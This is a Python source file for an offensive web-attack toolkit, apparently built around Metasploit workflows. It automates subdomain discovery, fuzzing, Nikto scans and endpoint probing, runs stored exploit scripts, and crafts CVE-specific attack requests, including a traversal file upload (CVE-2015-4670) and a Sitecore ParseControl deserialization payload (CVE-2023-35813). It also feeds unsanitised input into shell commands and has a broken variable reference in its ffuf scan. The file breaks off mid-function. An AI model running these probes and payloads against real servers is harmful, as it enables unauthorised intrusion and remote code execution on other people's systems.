import os
import subprocess
import shlex
import scapy.all as scapy
import socket
import time
import sys
import select
import threading
import subprocess
import re
import struct
import random
import requests
import urllib.parse
import readline
import validators
import argparse
import hashlib
import multiprocessing
import json
from collections import Counter
import optparse
import signal
import uuid
import ctypes
import dns.resolver
import dns.rdatatype
import tqdm
import phonenumbers, sys, os, argparse
from colorama import init, Fore
import phonenumbers
from phonenumbers import geocoder, timezone, carrier
#from opencage.geocoder import OpenCageGeocode
#import folium
import termios
import tty
import pty
import signal
import textwrap
import shutil
import pexpect
import configparser
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
from requests.exceptions import Timeout, RequestException
import sys
from collections import defaultdict
from nltk.tokenize import word_tokenize
from nltk.corpus import stopwords
from nltk.stem import PorterStemmer
import nltk
from nltk.data import find
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
from datetime import datetime, timedelta
import openai
import qrcode

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass
    
def banner():
    """
    Prints one of five ASCII art banners based on a randomly generated number.
    """
    # Generate a random integer between 1 and 4
    random_num = random.randint(1, 3)

    # Print one of the five outputs based on the random number generated
    if random_num == 1:
        print("""
8b           d8   ad88                          88b           d88   ad88888ba   88888888888  
`8b         d8'  d8"                            888b         d888  d8"     "8b  88           
 `8b       d8'   88                             88`8b       d8'88  Y8,          88           
  `8b     d8'  MM88MMM  ,adPPYba,   8b,dPPYba,  88 `8b     d8' 88  `Y8aaaaa,    88aaaaa      
   `8b   d8'     88    a8"     "8a  88P'   "Y8  88  `8b   d8'  88    `""""8b,   88"""""      
    `8b d8'      88    8b       d8  88          88   `8b d8'   88          `8b  88           
     `888'       88    "8a,   ,a8"  88          88    `888'    88  Y8a     a8P  88           
      `8'        88     `"YbbdP"'   88          88     `8'     88   "Y88888P"   88  
       
    # Coded By Caleb McDaniels        
""")
    elif random_num == 2:
        print("""
Yb    dP  d8b            8b   d8 .d88b. 8888 
 Yb  dP   8'  .d8b. 8d8b 8YbmdP8 YPwww. 8www 
  YbdP   w8ww 8' .8 8P   8  "  8     d8 8    
   YP     8   `Y8P' 8    8     8 `Y88P' 8   
    
    # Coded By Caleb McDaniels
""")
    elif random_num == 3 or random_num == 4:
        print("""
                ,...                                                 
`7MMF'   `7MF'.d' ""            `7MMM.     ,MMF' .M""bgd `7MM""YMM 
  `MA     ,V  dM`                 MMMb    dPMM  ,MI    "Y   MM    `7 
   VM:   ,V  mMMmm,pW"Wq.`7Mb,od8 M YM   ,M MM  `MMb.       MM      
    MM.  M'   MM 6W'   `Wb MM' "' M  Mb  M' MM    `YMMNq.   MM""MM   
    `MM A'    MM 8M     M8 MM     M  YM.P'  MM  .     `MM   MM      
     :MM;     MM YA.   ,A9 MM     M  `YM'   MM  Mb     dM   MM       
      VF    .JMML.`Ybmd9'.JMML. .JML. `'  .JMML.P"Ybmmd"  .JMML.   
        
    # Coded By Caleb McDaniels
""")

sessions = {}
session_counter = 1
terminal_size = shutil.get_terminal_size((80, 20))  # Default to 80x20 if unable to determine
terminal_width = terminal_size.columns
current_index = -1

# Initialize a ConfigParser object
config = configparser.ConfigParser()

# Define default values for Metasploit parameters as variables
default_payload = ""
default_payloadfile = ""
default_lport = ""
default_lhost = ""
default_rhosts = ""
default_password_wordlist = ""
default_user_wordlist = ""
default_exploit_target = ""
default_exit_on_session = ""
default_verbose = ""
default_rport = ""
default_evasion = ""
default_nop = ""
default_badchars = ""
default_timeout = ""
default_http_user_agent = ""
default_ssl = ""
default_encoder = ""
default_iterations = ""

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Input static or default wordlist values
sql_endpoints_file = "/home/kali/VforMSF/wordlists/SQLEndpoints.txt"
lfi_endpoints_file = "/home/kali/VforMSF/wordlists/LFIEndpoints.txt"
deserialization_endpoints_file = "/home/kali/VforMSF/wordlists/DeserializationEndpoints.txt"
upload_endpoints_file = "/home/kali/VforMSF/wordlists/UploadEndpoints.txt"
exploits_directory = "/home/kali/VforMSF/exploits/"
dirb_default_wordlist = "/usr/share/dirb/wordlists/big.txt"
#ffuf_default_wordlist = "/usr/share/dirb/wordlists/big.txt"
ffuf_default_wordlist = "/home/kali/VforMSF/wordlists/medium-directory-list-lowercase-2.3-medium.txt"
misc_vuln_endpoints = "/home/kali/VforMSF/wordlists/MiscVulnerableEndpoints.txt"
misc_vuln_endpoints_2 = "/home/kali/VforMSF/wordlists/MiscVulnerableEndpoints_2.txt"
endpoints_with_paths = "/home/kali/VforMSF/wordlists/AllFilesWithPath.txt"
sublist3r_output_file = "/home/kali/VforMSF/temp/subdomains.txt"
payloads_directory = "/home/kali/VforMSF/payloads/"

# Set global variables
globaltarget = None
globaltargetenabled = False
limitloop = False
target_is_ip = False
target_is_url = False

scheduled_commands = []

banner()

def generate_qr_code(url_input):
    print("QR Code Generator")
    print("")
    
    if not url_input:
        url_input = input("Enter the URL/destination (press enter to exit)> ").strip()
        if not url_input:
            color = "\033[93m"
            reset_color = "\033[0m"
            print(f"{color}[-] exiting...{reset_color}")
            return

    file_name = input("Enter the file name (press enter to exit)> ").strip()
    if not file_name:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] exiting...{reset_color}")
        return
    
    if not file_name.endswith(".png"):
        file_name += ".png"

    full_path = os.path.join(payloads_directory, file_name)
    
    qr = qrcode.QRCode(
        version=1,  
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(url_input)
    qr.make(fit=True)
    
    qr_image = qr.make_image(fill_color="black", back_color="white")
    
    qr_image.save(full_path)
    
    color = "\033[92m"
    reset_color = "\033[0m"
    print(f"{color}[+] QR code saved as {file_name}{reset_color}")

def cancel_scheduled_command(command):
    for entry in scheduled_commands:
        if entry["command"] == command and entry["timer"].is_alive():
            entry["timer"].cancel()
            scheduled_commands.remove(entry)
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] Scheduled command '{command}' has been canceled.{reset_color}")
            return
    color = "\033[93m"
    reset_color = "\033[0m"
    print(f"{color}[-] No scheduled command found.{reset_color}")

def cancel_all_scheduled_commands():
    for entry in scheduled_commands[:]:  # Use a copy to avoid modification issues
        if entry["timer"].is_alive():
            entry["timer"].cancel()
            print(f"[+] Scheduled command '{entry['command']}' has been canceled.")
        # Remove the entry whether the timer was active or not
        scheduled_commands.remove(entry)

    if not scheduled_commands:
        color = "\033[92m"  # Green color
        reset_color = "\033[0m"
        print(f"{color}[+] All scheduled commands have been canceled.{reset_color}")
    else:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] Some scheduled commands could not be cleared.{reset_color}")

def write_to_terminal(command, master):
    if master is None or not isinstance(master, int):
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] Master file descriptor is not initialized or invalid.{reset_color}")
        return

    try:
        os.write(master, f"{command}\n".encode())
    except OSError as os_error:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] OS error while writing to terminal: {os_error}{reset_color}")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] Failed to write command to terminal: {e}{reset_color}")

def run_command(command, master):
    try:
        color = "\033[92m"
        reset_color = "\033[0m"
        print(f"{color}[+] Sending command to terminal: {command}{reset_color}")
        write_to_terminal(command, master)
    except Exception as e:
        color = "\033[93m"  # Yellow for warnings/errors
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred while sending the command: {e}{reset_color}")

def schedule_command_with_delay(command, delay_in_seconds, master):
    run_at = datetime.now() + timedelta(seconds=delay_in_seconds)
    print(f"[+] {command} will run in {delay_in_seconds} seconds (at {run_at.strftime('%Y-%m-%d %H:%M:%S')}).")

    # Create the timer and store it in the list
    timer = threading.Timer(delay_in_seconds, run_command, [command, master])
    scheduled_commands.append({
        "command": command,
        "timer": timer,
        "type": "delay-based",
        "time": run_at.strftime('%Y-%m-%d %H:%M:%S'),
    })

    # Start the timer
    timer.start()

def print_scheduled_commands():
    if not scheduled_commands:
        print("[-] No commands are currently scheduled.")
        return

    print(f"[+] Scheduled Commands:")
    print("=======================")

    now = datetime.now()
    past_commands = []
    upcoming_commands = []

    for entry in scheduled_commands:
        scheduled_time = datetime.strptime(entry['time'], '%Y-%m-%d %H:%M:%S')
        if scheduled_time < now:
            past_commands.append(entry)
        else:
            upcoming_commands.append(entry)

    if past_commands:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] Past Commands:{reset_color}")
        for idx, entry in enumerate(past_commands, 1):
            print(f"{idx}. Command: {entry['command']}")
            print(f"   Scheduled Time: {entry['time']}")
        print()

    if upcoming_commands:
        color = "\033[92m"
        reset_color = "\033[0m"
        print(f"{color}[+] Upcoming Commands:{reset_color}")
        for idx, entry in enumerate(upcoming_commands, 1):
            print(f"{idx}. Command: {entry['command']}")
            print(f"   Scheduled Time: {entry['time']}")
        print()

def process_wordlist_ffuf(sublist3r_output_file):
    try:
        with open(sublist3r_output_file, "r") as file:
            for line in file:
                domain = line.strip()
                if domain:
                    protocol = check_protocol(domain)
                    if protocol:
                        full_url = f"{protocol}{domain}"
                        run_ffuf_scan(full_url)
                else:
                    print(f"[-] Error initiating scan")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def run_ffuf_scan(full_url):
    try:
        print(" ")
        print("[+] Fuzzing for Directories...")
        print(" ")
        command = f"ffuf -u {domain}/FUZZ -w {ffuf_default_wordlist} -c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -t 50 -sf -ac"
        subprocess.call(command, shell=True)
    except KeyboardInterrupt:
        print("[-] KeyboardInterrupt detected. Moving on...")
        print(" ")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def process_wordlist_nikto(sublist3r_output_file):
    try:
        with open(sublist3r_output_file, "r") as file:
            for line in file:
                domain = line.strip()
                if domain:
                    run_nikto_scan(domain)
                else:
                    print(f"[-] Error initiating scan")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def run_nikto_scan(domain):
    try:
        print(" ")
        print("[+] Running Nikto Vulnerability Scan...")
        print(" ")
        command = f"nikto -h {domain} -Display 4P -C all"
        subprocess.call(command, shell=True)
    except KeyboardInterrupt:
        print("[-] KeyboardInterrupt detected. Moving on...")
        print(" ")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def process_wordlist_check_endpoints(sublist3r_output_file, domain, filename):
    try:
        with open(sublist3r_output_file, "r") as file:
            for line in file:
                hostname = line.strip()  # Remove any leading/trailing whitespace
                protocol = check_protocol(hostname)
                domain = f"{protocol}{hostname}"
                print("")
                if domain:  # Ensure the line is not empty
                    check_endpoints(domain, filename)
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}An error occurred while processing the wordlist: {e}{reset_color}")

def check_protocol(hostname):
    https_url = f"https://{hostname}"
    http_url = f"http://{hostname}"
    
    try:
        # Try HTTPS first
        response = requests.get(https_url, timeout=5)
        if response.status_code in [200, 300, 301, 302, 303, 304]:
            return "https://"
    except requests.RequestException:
        pass
    
    try:
        # Fallback to HTTP if HTTPS fails
        response = requests.get(http_url, timeout=5)
        if response.status_code in [200, 300, 301, 302, 303, 304]:
            return "http://"
    except requests.RequestException:
        pass
    
    return "http"

def process_wordlist_check_cve(sublist3r_output_file, domain):
    try:
        with open(sublist3r_output_file, "r") as file:
            for line in file:
                hostname = line.strip()  # Remove any leading/trailing whitespace
                protocol = check_protocol(hostname)
                domain = f"{protocol}{hostname}"
                print("")
                print(f"Checking {domain} Against our Exploit Scripts...")
                print("")
                if domain:  # Ensure the line is not empty
                    check_cve(domain)
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}An error occurred while processing the wordlist: {e}{reset_color}")

def is_valid_subdomain(subdomain):
    url = f"https://{subdomain}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code in [200, 301, 302]:
            return True
    except requests.RequestException:
        pass
    return False

def capture_subdomains(domain, sublist3r_output_file):
    hostname = urllib.parse.urlsplit(domain).hostname
    if not hostname:
        print(f"[-] Invalid domain: {domain}")
        return

    try:
        command = f"subfinder -t 32 -d {hostname}"
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        with open(sublist3r_output_file, "w") as file:
            file.write(f"{hostname}\n")
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] {hostname} has been added to subdomains.txt{reset_color}")
            line_count = 0
            subdomains = []

            for line in result.stdout:
                line_count += 1
                # Display the first 24 lines (banner)
                if line_count <= 24:
                    print(line.strip())
                    continue

                # Regular expression to match ANSI escape sequences
                ansi_escape = re.compile(r'\x1B\[\d+m')
                # Remove ANSI escape codes and unwanted sequences
                clean_line = ansi_escape.sub('', line).strip()
                clean_line = re.sub(r'^\d+m|\d+m$', '', clean_line)

                if clean_line:
                    subdomains.append(clean_line)

            # Validate subdomains concurrently
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future_to_subdomain = {executor.submit(is_valid_subdomain, sd): sd for sd in subdomains}
                for future in concurrent.futures.as_completed(future_to_subdomain):
                    subdomain = future_to_subdomain[future]
                    try:
                        if future.result():
                            file.write(f"{subdomain}\n")
                            color = "\033[92m"
                            reset_color = "\033[0m"
                            print(f"{color}[+] {subdomain} has been validated and added to subdomains.txt{reset_color}")
                    except Exception as exc:
                        # Optionally log exceptions or handle specific cases
                        pass

        result.wait()
        if result.returncode != 0:
            stderr_output = result.stderr.read()
            print(f"[-] Command failed with exit code {result.returncode}: {stderr_output}")
    except Exception as e:
        pass

def vsearch(search_input):
    directory = exploits_directory
    if not os.path.isdir(directory):
        print("[-] Invalid directory")
    else:
        file_keywords = index_files(directory)

    search_terms = search_input.split()  # Split search input by spaces
    results = search_files(file_keywords, search_terms)
            
    if results:
        print("[+] Search results:")
        for idx, (file, score) in enumerate(results, start=1):
            print(f"{idx}. {file}:")
                
        # Prompt user to select a file
        while True:
            selection = input_with_backspace(f"\nInteract with 'info [number]' or 'use [number]' (Press enter to exit)> ").strip()
            if not selection:
                return
            parts = selection.split(" ", 1)
            if len(parts) != 2:
                print("[-] Invalid selection. Available commands are 'info' or 'use' [number]")
                continue
            interaction = parts[0].strip()
            selected = parts[1].strip()
            if selected.isdigit() and 1 <= int(selected) <= len(results):
                selected_file = results[int(selected) - 1][0]
                if interaction in ["use", "info"]:
                    if interaction == "info":
                        function_name = f"info_on_{os.path.splitext(os.path.basename(selected_file))[0]}"
                        function = globals().get(function_name)
                        if function:
                            function()
                        else:
                            print(f"[-] No info function found for {selected_file}")

                    if interaction == "use":
                        print(f"[+] Executing: {selected_file}")
                        print("")
                        try:
                            full_path = os.path.join(directory, selected_file)
                            subprocess.run(["python3", full_path], check=True) #only python scripts in the exploit directory
                        except subprocess.CalledProcessError as e:
                            print(f"[-] Error executing {selected_file}: {e}")
                        print("")
                        color = "\033[92m"
                        reset_color = "\033[0m"
                        print(f"{color}[+] completed{reset_color}")
                        print("")
                        print("[+] Search results:")
                        for idx, (file, score) in enumerate(results, start=1):
                            print(f"{idx}. {file}:")
                else:
                    print("[-] Invalid selection. Available commands are 'info' or 'use' [number]")
            else:
                print("[-] Invalid selection. Please enter a valid number.")
    else:
        print("[-] No results from search.")

def info_on_CVE_2015_4670():
    print("""
    CVE-2015-4670:
    --------------------
    **Description**:
    - Directory traversal vulnerability in the AjaxFileUpload control in DevExpress AJAX Control Toolkit (aka AjaxControlToolkit) before 15.1.
    - Allows remote attackers to write to arbitrary files via a .. (dot dot) in the fileId parameter to AjaxFileUploadHandler.axd.
    - This can be exploited to upload a shell leading to remote code execution.
    """)

def info_on_CVE_2020_7961():
    print("""
    CVE-2020-7961:
    --------------------
    **Description**:
    - A remote code execution (RCE) vulnerability in Liferay Portal through 7.2.0 and Liferay DXP through 7.2.
    - The JSON web services in Liferay Portal and Liferay DXP allow remote attackers to execute arbitrary code via a crafted JSON web service request.
    **Affected Versions**:
    """)

def info_on_CVE_2021_34427():
    print("""
    CVE-2021-34427:
    --------------------
    **Description**:
    - In Eclipse BIRT versions 4.8.0 and earlier, an attacker can use query parameters to create a JSP file which is accessible from remote (current BIRT viewer dir) to inject JSP code into the running instance.
    - A successful exploit could allow remote code execution
    **Affected Versions**:
    - Eclipse BIRT versions 4.8.0 and earlier.
    """)

def info_on_CVE_2022_21445():
    print("""
    CVE-2022-21445:
    --------------------
    **Description**:
    - Vulnerability in the Oracle E-Business Suite (component: Oracle Marketing).
    - Supported versions that are affected are 12.2.9-12.2.10.
    - Easily exploitable vulnerability allows with network access to compromise Oracle Marketing via HTTP.
    - A successful exploit could allow remote code execution
    **Affected Versions**:
    - Oracle ADF 12.2.9-12.2.10
    """)

def info_on_CVE_2022_41326():
    print("""
    CVE-2022-41326:
    --------------------
    **Description**:
    - The web conferencing component of Mitel MiCollab through 9.6.0.13 could allow an unauthenticated attacker to upload arbitrary scripts due to improper authorization controls.
    - A successful exploit could allow remote code execution within the context of the application.
    **Affected Versions**:
    - Mitel MiCollab through 9.6.0.13.
    """)

def info_on_CVE_2023_0100():
    print("""
    CVE-2023-0100:
    --------------------
    **Description**:
    - In Eclipse BIRT, starting from version 2.6.2, the default configuration allowes you to retrieve a report from the same host using an absolute HTTP path for the report parameter (e.g., __report=http://<domain>/report.rptdesign).
    - The Host header can be tampered with on some configurations where no virtual hosts are put in place or when the default host points to the BIRT server.
    **Affected Versions**:
    - Eclipse BIRT starting from version 2.6.2 up to 4.12.
    **Patch**:
    - This vulnerability was patched on Eclipse BIRT 4.13.
    """)

def info_on_CVE_2023_35813():
    print("""
    CVE-2023-35813:
    --------------------
    **Description**:
    - Multiple Sitecore products are vulnerable to remote code execution.
    - This affects Experience Manager, Experience Platform, and Experience Commerce through 10.3.
    """)

def info_on_CVE_2024_32651():
    print("""
    CVE-2024-32651:
    --------------------
    **Description**:
    - Changedetection.io is an open-source web page change detection, website watcher, restock monitor, and notification service.
    - There is a Server Side Template Injection (SSTI) in Jinja2 that allows Remote Command Execution on the server host.
    - The impact is critical as the attacker can completely take over the server machine.
    - This can be reduced if changedetection is behind a login page, but this isn't required by the application (not by default).
    """)

def info_on_DecisionsFileWrite():
    print("""
    Decisions /xml/WriteFile:
    -------------------------
    **Description**:
    - Many decisions software versions contain endpoints allowing arbitrary file upload.
    - This specific /xml/WriteFile endpoint allows you to specify a path for the file.
    - Specifying the root web directory enables you to write a malicious file that can be navigated to and subsequentially executed.
    - By default this endpoint was unauthenticated with a few other vulnerable endpoints but was silently patched out of Decisions.
    - Since it does not have a CVE assigned to it, many applications utilizing decisions may be unaware.
    """)

def info_on_LogiSecureKey():
    print("""
    Logi /rdGetSecureKey.aspx:
    -------------------------
    **Description**:
    - An issue was discovered in Logi SecureKey Authenticaton.
    - The SecureKey used within the application can be found at a specific endpoint by providing an arbitrary username.
    - This key gives access to the logi functonality which can be utilized in a subsequent request to execute shell commands on the system via HTTP.
    """)

def is_nltk_data_downloaded(package):
    try:
        find(f'tokenizers/{package}')
        return
    except LookupError:
        download_nltk_data()

def download_nltk_data():
    original_stdout = sys.stdout  # Save a reference to the original standard output
    original_stderr = sys.stderr  # Save a reference to the original standard error
    sys.stdout = open(os.devnull, 'w')  # Redirect standard output to null
    sys.stderr = open(os.devnull, 'w')  # Redirect standard error to null
    try:
        if not is_nltk_data_downloaded('punkt'):
            nltk.download('punkt')
        if not is_nltk_data_downloaded('stopwords'):
            nltk.download('stopwords')
    finally:
        sys.stdout.close()  # Close the redirected standard output
        sys.stderr.close()  # Close the redirected standard error
        sys.stdout = original_stdout  # Reset standard output to original
        sys.stderr = original_stderr  # Reset standard error to original

def index_files(directory):
    file_keywords = defaultdict(list)
    stop_words = set(stopwords.words('english'))
    ps = PorterStemmer()

    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Tokenize content using NLTK
                    words = word_tokenize(content)
                    # Remove stop words and stem the remaining words
                    keywords = [ps.stem(word) for word in words if word.isalnum() and word.lower() not in stop_words]
                    file_keywords[file].extend(keywords)
            except Exception as e:
                color = "\033[93m"
                reset_color = "\033[0m"
                print(f"{color}Failed to read {file_path}: {e}{reset_color}")

    return file_keywords

def search_files(file_keywords, search_terms):
    ps = PorterStemmer()
    processed_terms = [ps.stem(term) for term in search_terms]

    results = []

    for file, keywords in file_keywords.items():
        score = sum(keywords.count(term) for term in processed_terms)  # Calculate score based on keyword occurrences
        if score > 0:
            results.append((file, score))

    # Sort results by score in descending order
    results.sort(key=lambda x: x[1], reverse=True)

    return results

def list_all_files(directory):
    files = []
    for root, _, filenames in os.walk(directory):
        for file in filenames:
            files.append(file)
    return files

def enable_global_target(url_input):
    global globaltarget, globaltargetenabled, target_is_ip, target_is_url
    
    while True:
        if url_input:
            target = url_input
        else:
            target = input_with_backspace("\nGlobal Target IP or URL (Press enter to exit)> ")
            if not target:
                return  # Exit the function if the user presses Enter without inputting anything
        
        if validators.url(target):
            globaltarget = target
            globaltargetenabled = True
            target_is_ip = False
            target_is_url = True
            print("")
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] Global target set to URL: {globaltarget}{reset_color}")
            break
        elif validate_ip_address(target):
            globaltarget = target
            globaltargetenabled = True
            target_is_ip = True
            target_is_url = False
            print("")
            print(f"{color}[+] Global target set to IP: {globaltarget}{reset_color}")
            break
        else:
            print("[-] Invalid input. Please enter a valid IP address or URL.")

def disable_global_target():
    global globaltarget, globaltargetenabled, target_is_ip, target_is_url, limitloop
    
    globaltarget = None
    globaltargetenabled = False
    target_is_ip = False
    target_is_url = False
    limitloop = False
    print("")
    print("[-] Global target disabled.")

def read_endpoints_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            endpoints = file.read().splitlines()
        return endpoints
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred while reading the file: {e}{reset_color}")
        return []

def send_get_request(domain, endpoint):
    url = f"{domain}{endpoint}"
    headers = {
        "Host": domain.split("//")[-1],
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    return response

def check_endpoints(domain, endpoints_file):
    endpoints = read_endpoints_from_file(endpoints_file)
    
    if not endpoints:
        print(f"[-] No endpoints found in {endpoints_file} to check.")
        return
    
    error_count = 0  
    error_limit = 20  # Limit for the number of consecutive errors
    error_count_403 = 0  
    error_limit_403 = 20  # Limit for the number of consecutive errors

    for endpoint in endpoints:
        response = send_get_request(domain, endpoint)
        status_code = response.status_code

        if status_code in [200, 403, 500]:
            color = "\033[92m" if status_code == 200 else "\033[93m" if status_code == 500 else "\033[91m"
            print(f"{color}{endpoint} - Response Code: {status_code}\033[0m")

            if status_code == 403:
                error_count_403 += 1
                if error_count_403 > error_limit_403:
                    print(f"[-] 403 limit reached, we may be blocked, moving on...")
                    break  # Stop processing further endpoints

            if status_code == 500:
                error_count += 1
                if error_count > error_limit:
                    print(f"[-] Too many consecutive errors, moving on...")
                    break  # Stop processing further endpoints

            else:
                error_count = 0  # Reset counter if a non-error code is found
                error_count_403 = 0

def send_initial_request_cve_2015_4670(domain):
    url = f"{domain}/SFTWealthPortal/Login/AjaxFileUploadHandler.axd?contextKey=%7BDA8BEDC8-B952-4d5d-8CC2-59FE922E2923%7D&fileId=1&fileName=D:%5CAddVantageSites%5CSFT%5CAddVantageBrowser%5CLogin%5Ctest.aspx&firstChunk=true&chunked=false"
    headers = {
        "Host": domain.split("//")[-1],
        "Content-Length": "915",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Windows",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryc8enGTRWBQW77cvL",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }
    data = '''------WebKitFormBoundaryc8enGTRWBQW77cvL
Content-Disposition: form-data; name="test"; filename="test.txt"
test

------WebKitFormBoundaryc8enGTRWBQW77cvL--'''
    
    try:
        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2021_34427(domain):
    url = f"{domain}/birt/document?__report=test.rptdesign"
    headers = {
        "Host": domain.split("//")[-1],  # Extract the host part from the domain
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "macOS",
        "Accept-Language": "en-US",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2022_21445(domain):
    # Request to GET /pipe/afr/aaa/remote/ as a check
    url = f"{domain}/pipe/afr/aaa/remote/"
    headers = {
        "Host": domain.split("//")[-1],  # Extract the host part from the domain
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Dnt": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "keep-alive"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2022_41326(domain):
    url = f"{domain}/awcuser/cgi-bin/vcs?xml=withXsl"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2023_0100(domain):
    try:
        response = requests.get(f"{domain}/birt/auth?username=test&dataOwner=1", verify=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2023_35813(domain):
    url = f"{domain}/~/xaml/Sitecore.Xaml.Tutorials.Styles.Index"
    headers = {
        "Host": domain.split("//")[-1],  # Extract the host part from the domain
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\"%3C%25@%20Register%20TagPrefix='x'%20Namespace='System.Runtime.Remoting.Services'%20Assembly='System.Runtime.Remoting,%20Version=4.0.0.0,%20Culture=neutral,%20PublicKeyToken=b77a5c561934e089'%20%25%3E%3Cx:RemotingService%20runat='server'%20Context-Response-ContentType='vulncheck'%20/%3E%0A\")"

    try:
        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2024_32651(domain):
    collaborator = "google.com"
    test_command = "echo test"
    url = f"{domain}/api/email_borrower_agreement/"
    headers = {
        "Host": domain.split("//")[-1],  # Extract the host part from the domain
        "Connection": "close",
